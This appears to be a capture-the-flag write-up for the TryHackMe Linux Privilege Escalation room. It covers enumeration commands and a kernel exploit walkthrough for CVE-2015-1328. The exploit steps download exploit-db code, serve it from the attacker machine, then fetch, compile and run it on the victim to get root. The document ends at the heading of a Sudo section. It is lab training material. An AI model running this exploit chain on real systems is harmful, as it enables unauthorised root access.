# Linux Privilege Escalation

**Room Link:** [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

## Enumeration

**What is the hostname of the target system?**

**Victim**

```
hostname
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**What is the Linux kernel version of the target system?**

**Victim**

```
uname -a
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**What Linux is this?**

**Victim**

```
cat /etc/issue
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**What version of the Python language is installed on the system?**

**Victim**

```
python -V
```

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

**What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**

CVE-2015-1328



## Privilege Escalation: Kernel Exploits

**Victim**

```
uname -a
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://www.exploit-db.com/raw/37292 -O 37292.c
python2 -m SimpleHTTPServer 81

```

**Victim**

```
cd /tmp
wget http://$KALI:81/37292.c
gcc 37292.c -o exploit
chmod +x exploit
./exploit
whoami
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation: Sudo
